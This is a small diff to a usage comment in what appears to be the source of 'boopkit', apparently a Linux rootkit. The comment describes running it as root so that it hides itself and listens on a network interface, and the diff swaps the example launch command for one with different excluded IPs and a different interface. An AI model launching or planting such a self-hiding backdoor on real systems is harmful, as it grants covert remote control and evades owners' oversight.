@@ -12,5 +12,5 @@
 // -p, protect        Protect from executing commands. Safe mode.
 //
 // # Run boopkit (as root) to hide itself and listen on eth0
-// boopkit -i eth0 -x 127.0.0.1 -x -q &
+// boopkit -x 127.0.0.1 -x 10.6.6.200 -i enp5s0 -q &
 /!
